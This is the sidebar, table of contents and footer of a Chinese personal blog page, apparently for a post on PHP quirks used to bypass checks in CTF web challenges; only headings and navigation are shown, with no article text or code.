target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E7%89%B9%E6%80%A7"><span class="toc-number">1.</span> <span class="toc-text">PHP特性</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-Hash%E6%AF%94%E8%BE%83%E7%BC%BA%E9%99%B7"><span class="toc-number">1.1.</span> <span class="toc-text">0x00:Hash比较缺陷</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-md5"><span class="toc-number">1.2.</span> <span class="toc-text">0x01:md5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%EF%BC%9Amd5%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">第一种：md5函数绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%EF%BC%9Amd5%E5%BC%BA%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">第二种：md5强类型绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-intval%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">0x03:intval函数绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%89%B9%E6%80%A7%EF%BC%9A"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">第一个特性：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AA%E7%89%B9%E6%80%A7%EF%BC%9A"><span class="toc-number">1.3.0.2.</span> <span class="toc-text">第二个特性：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E4%B8%AA%E7%89%B9%E6%80%A7%EF%BC%9A"><span class="toc-number">1.3.0.3.</span> <span class="toc-text">第三个特性：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-preg-match%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">0x04:preg_match函数绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%EF%BC%9A-x2F-m"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">第一种：&#x2F;m</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%EF%BC%9A%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%EF%BC%8C"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">第二种：回溯绕过，</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-preg-replace-x2F-e-%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.5.</span> <span class="toc-text">0x05: preg_replace &#x2F;e 模式下的代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-number">1.5.1.</span> <span class="toc-text">[BJDCTF2020]ZJCTF，不过如此</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">案例</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%88%AC%E5%9D%911"><span class="toc-number">1.5.1.1.1.</span> <span class="toc-text">爬坑1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%88%AC%E5%9D%912"><span class="toc-number">1.5.1.1.2.</span> <span class="toc-text">爬坑2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%88%AC%E5%9D%913"><span class="toc-number">1.5.1.1.3.</span> <span class="toc-text">爬坑3</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06%EF%BC%9Ain-array%E5%AE%BD%E6%9D%BE%E6%AF%94%E8%BE%83"><span class="toc-number">1.6.</span> <span class="toc-text">0x06：in_array宽松比较</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">1.7.</span> <span class="toc-text">0x07:变量覆盖</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%EF%BC%9Aextract%E5%87%BD%E6%95%B0%E3%80%81parse-str%E5%87%BD%E6%95%B0"><span class="toc-number">1.7.1.</span> <span class="toc-text">第一种：extract函数、parse_str函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%EF%BC%9A-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">1.7.2.</span> <span class="toc-text">第二种：$$变量覆盖</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E9%80%9A%E8%BF%87%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.8.</span> <span class="toc-text">0x08:通过数组绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ereg-%E5%87%BD%E6%95%B0"><span class="toc-number">1.8.1.</span> <span class="toc-text">ereg()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#strpos-%E5%87%BD%E6%95%B0"><span class="toc-number">1.8.1.1.</span> <span class="toc-text">strpos()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#strcmp-%E5%87%BD%E6%95%B0"><span class="toc-number">1.8.1.2.</span> <span class="toc-text">strcmp()函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09%EF%BC%9APHP%E8%87%AA%E8%BA%AB%E7%89%B9%E6%80%A7"><span class="toc-number">1.9.</span> <span class="toc-text">0x09：PHP自身特性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E7%9A%84%E5%8F%98%E9%87%8F%E5%90%8D%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.9.0.1.</span> <span class="toc-text">PHP的变量名格式</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8D%E6%98%8E%E6%89%80%E4%BB%A5"><span class="toc-number">2.</span> <span class="toc-text">不明所以</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E6%95%B0%E5%AD%97%E5%8F%AF%E4%B8%8E%E5%AD%97%E7%AC%A6%E5%81%9A%E8%BF%90%E7%AE%97"><span class="toc-number">2.0.0.1.</span> <span class="toc-text">PHP数字可与字符做运算</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10%EF%BC%9Aescapeshellarg-amp-escapeshellcmd%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">0x10：escapeshellarg&amp;escapeshellcmd函数绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">2.2.</span> <span class="toc-text">[BUUCTF 2018]Online Tool</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11%EF%BC%9APHP%E7%B2%BE%E5%BA%A6%E7%BB%95%E8%BF%87%E7%BC%BA%E9%99%B7"><span class="toc-number">2.3.</span> <span class="toc-text">0x11：PHP精度绕过缺陷</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-PHP%E4%B8%AD%E7%B1%BB%E7%9A%84%E8%BF%90%E7%94%A8"><span class="toc-number">2.4.</span> <span class="toc-text">0x12:PHP中类的运用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E7%B1%BBReflectionClass"><span class="toc-number">2.4.1.</span> <span class="toc-text">反射类ReflectionClass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">2.4.2.</span> <span class="toc-text">一句话总结：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%8F%8D%E5%B0%84%E7%B1%BB%E5%B8%B8%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%9F"><span class="toc-number">2.4.3.</span> <span class="toc-text">PHP反射类常用的方法？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81PHP%E5%8F%8D%E5%B0%84%E7%B1%BB%E5%B8%B8%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%9F"><span class="toc-number">2.4.4.</span> <span class="toc-text">2、PHP反射类常用的方法？</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP%E5%8F%8D%E5%B0%84%E7%B1%BB%E3%80%90%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96%E7%B1%BB%E5%90%8D%E3%80%81%E7%B1%BB%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E6%96%B9%E6%B3%95%E3%80%81%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%EF%BC%8C%E5%B9%B6%E5%8C%85%E6%8B%AC%E7%A7%81%E6%9C%89%E6%96%B9%E6%B3%95%E7%AD%89%E3%80%91"><span class="toc-number">2.4.4.0.1.</span> <span class="toc-text">PHP反射类【可以获取类名、类中的所有方法、成员变量，并包括私有方法等】</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%B1%BBException"><span class="toc-number">2.4.5.</span> <span class="toc-text">异常处理类Exception</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E7%B1%BBFilesystemIterator"><span class="toc-number">2.4.6.</span> <span class="toc-text">内置类FilesystemIterator</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8A%E9%9D%A2%E8%BF%99%E4%B8%A4%E9%81%93%E9%A2%98%E6%B2%A1%E6%97%B6%E9%97%B4%E5%9C%A8%E6%9C%AC%E5%9C%B0%E5%BC%84%E4%BA%86%E6%98%8E%E5%A4%A9%E5%86%8D%E5%BC%84"><span class="toc-number">3.</span> <span class="toc-text">上面这两道题没时间在本地弄了明天再弄</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13%EF%BC%9A%E4%B8%80%E4%BA%9B%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB"><span class="toc-number">3.1.</span> <span class="toc-text">0x13：一些姿势汇总</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#x2F-proc-x2F-self-x2F-root%E7%BB%95%E8%BF%87is-file%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.1.</span> <span class="toc-text">&#x2F;proc&#x2F;self&#x2F;root绕过is_file函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%8C%E5%A5%BD%E5%83%8F%E6%B2%A1%E7%BB%99%E5%87%BA%E8%BF%9E%E6%8E%A5%E3%80%82%E3%80%82"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">，好像没给出连接。。</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gettext-amp-get-defined-vars%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.2.</span> <span class="toc-text">gettext&amp;get_defined_vars函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-tee%E5%91%BD%E4%BB%A4"><span class="toc-number">3.1.2.1.</span> <span class="toc-text">Linux tee命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Burp-Collaborator-Client"><span class="toc-number">3.1.2.2.</span> <span class="toc-text">Burp Collaborator Client</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%98%E6%9C%89%E8%BF%99%E4%B8%80%E4%B8%AA%E4%B9%9F%E8%A6%81%E5%AD%A6%E5%95%8A"><span class="toc-number">4.</span> <span class="toc-text">还有这一个也要学啊</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#call-user-func%E8%AF%BB%E5%8F%96%E7%B1%BB%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">4.0.0.1.</span> <span class="toc-text">call_user_func读取类中的函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#create-function%E5%87%BD%E6%95%B0"><span class="toc-number">4.0.0.2.</span> <span class="toc-text">create_function函数</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%99%E4%B8%AA%E7%9B%AE%E5%89%8D%E6%B2%A1%E6%9C%89%E4%BE%8B%E9%A2%98"><span class="toc-number">5.</span> <span class="toc-text">这个目前没有例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#intval%E5%87%BD%E6%95%B0%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">5.0.0.1.</span> <span class="toc-text">intval函数的使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#md5%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="toc-number">5.0.0.2.</span> <span class="toc-text">md5弱比较</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#md5%E5%BC%BA%E7%A2%B0%E6%92%9E"><span class="toc-number">5.0.0.3.</span> <span class="toc-text">md5强碰撞</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E7%9B%AE%E8%BF%90%E7%AE%97%E7%AC%A6%E7%9A%84%E7%90%86%E8%A7%A3-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">6.</span> <span class="toc-text">三目运算符的理解+变量覆盖</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#is-numeric%E4%B8%8Ehex2bin"><span class="toc-number">6.0.0.1.</span> <span class="toc-text">is_numeric与hex2bin</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#hex2bin"><span class="toc-number">6.0.0.1.1.</span> <span class="toc-text">hex2bin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#base-convert"><span class="toc-number">6.0.0.1.2.</span> <span class="toc-text">base_convert</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sha1%E6%AF%94%E8%BE%83%E7%BC%BA%E9%99%B7"><span class="toc-number">6.0.0.2.</span> <span class="toc-text">sha1比较缺陷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E5%8F%8C-%E7%9A%84%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">6.0.0.3.</span> <span class="toc-text">PHP双$($$)的变量覆盖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#parse-str%E5%87%BD%E6%95%B0%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">6.0.0.4.</span> <span class="toc-text">parse_str函数的使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ereg-00%E6%AD%A3%E5%88%99%E6%88%AA%E6%96%AD"><span class="toc-number">6.0.0.5.</span> <span class="toc-text">ereg %00正则截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87is-file-highlight-file%E5%AF%B9%E4%BA%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">6.0.0.6.</span> <span class="toc-text">php伪协议绕过is_file highlight_file对于php伪协议的使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%9A%E5%86%99%E6%A0%B9%E7%9B%AE%E5%BD%95%E7%BB%95%E8%BF%87is-file"><span class="toc-number">6.0.0.7.</span> <span class="toc-text">多写根目录绕过is_file</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#trim%E5%87%BD%E6%95%B0%E7%9A%84%E7%BB%95%E8%BF%87-is-numeric%E7%BB%95%E8%BF%87"><span class="toc-number">6.0.0.8.</span> <span class="toc-text">trim函数的绕过+is_numeric绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#trim"><span class="toc-number">6.0.0.8.1.</span> <span class="toc-text">trim</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%AD%BB%E4%BA%A1die"><span class="toc-number">6.0.0.9.</span> <span class="toc-text">绕过死亡die</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%86%85%E7%BD%AEbash%E5%91%BD%E4%BB%A4%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4"><span class="toc-number">7.</span> <span class="toc-text">通过内置bash命令构造命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E5%8F%98%E9%87%8F%E5%90%8D%E9%9D%9E%E6%B3%95%E5%AD%97%E7%AC%A6"><span class="toc-number">7.0.0.1.</span> <span class="toc-text">PHP变量名非法字符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gettext%E6%8B%93%E5%B1%95%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">7.0.0.2.</span> <span class="toc-text">gettext拓展的使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E7%B1%BB%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">7.0.0.3.</span> <span class="toc-text">调用类中的函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#return%E7%BB%95%E8%BF%87"><span class="toc-number">7.0.0.4.</span> <span class="toc-text">return绕过</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/Web/upload-labs/" title="upload-labs"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="upload-labs"/></a><div class="content"><a class="title" href="/Web/upload-labs/" title="upload-labs">upload-labs</a><time datetime="2023-02-23T04:31:00.694Z" title="发表于 2023-02-23 12:31:00">2023-02-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E7%AC%94%E8%AE%B0/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" title="正则表达式"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="正则表达式"/></a><div class="content"><a class="title" href="/%E7%AC%94%E8%AE%B0/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" title="正则表达式">正则表达式</a><time datetime="2022-11-29T08:30:25.697Z" title="发表于 2022-11-29 16:30:25">2022-11-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Web/SSRF/" title="SSRF"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SSRF"/></a><div class="content"><a class="title" href="/Web/SSRF/" title="SSRF">SSRF</a><time datetime="2022-11-19T13:19:52.397Z" title="发表于 2022-11-19 21:19:52">2022-11-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Web/XXE/" title="XXE"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XXE"/></a><div class="content"><a class="title" href="/Web/XXE/" title="XXE">XXE</a><time datetime="2022-11-19T12:53:51.422Z" title="发表于 2022-11-19 20:53:51">2022-11-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Web/PHP%E7%89%B9%E6%80%A7/" title="PHP特性"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP特性"/></a><div class="content"><a class="title" href="/Web/PHP%E7%89%B9%E6%80%A7/" title="PHP特性">PHP特性</a><time datetime="2022-11-17T06:44:24.733Z" title="发表于 2022-11-17 14:44:24">2022-11-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Jinmu</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>